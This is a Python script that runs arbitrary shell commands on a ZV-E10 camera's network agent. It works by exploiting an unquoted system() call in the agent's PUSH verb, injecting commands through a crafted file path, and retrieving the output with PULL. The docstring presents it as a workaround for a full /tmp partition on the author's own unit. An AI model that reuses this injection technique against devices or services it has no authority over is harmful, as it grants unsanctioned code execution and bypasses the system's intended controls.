#!/usr/bin/env python3
"""Run one shell command on the ZV-E10 over the agent's TCP 7777 channel.

Why this exists: the agent's RUN verb writes its capture file into /tmp, and
this unit's /tmp (nflasha10) is full ("No space left on device"), so RUN always
answers ERR exec. Its PUSH verb builds `cp -a <path> <path>.orig` and hands that
unquoted to system(), so a path carrying shell metacharacters executes. This
wrapper uses that only to run commands and collect their output in /log (a
writable partition), and never to change /usr or the partition table.

Usage: camrun.py "<shell command>"
"""
import socket, sys, time

IP = '10.42.0.158'
OUT = '/log/.camrun_out.txt'


def conn():
    s = socket.create_connection((IP, 7777), timeout=15)
    s.settimeout(20)
    return s


def pull(s, path):
    p = path.encode()
    s.sendall(b'PULL %d\n' % len(p) + p)
    hdr = b''
    while not hdr.endswith(b'\n'):
        c = s.recv(1)
        if not c:
            raise EOFError('eof')
        hdr += c
    if not hdr.startswith(b'DATA '):
        return None
    n = int(hdr[5:])
    b = b''
    while len(b) < n:
        c = s.recv(min(65536, n - len(b)))
        if not c:
            break
        b += c
    return b


def inject(s, cmd):
    path = ('/log/.x;' + cmd + ';#').encode()
    blob = path + b'\0' + b'y'
    s.sendall(b'PUSH %d\n' % len(blob) + blob)
    try:
        return s.recv(64)
    except socket.timeout:
        return b'(timeout)'


def main():
    if len(sys.argv) < 2:
        sys.exit('usage: camrun.py "<command>"')
    cmd = sys.argv[1]
    s = conn()
    inject(s, '{ %s ; } > %s 2>&1' % (cmd, OUT))
    time.sleep(0.5)
    data = pull(s, OUT)
    s.close()
    sys.stdout.write((data or b'<<no output>>').decode('utf-8', 'replace'))


if __name__ == '__main__':
    main()
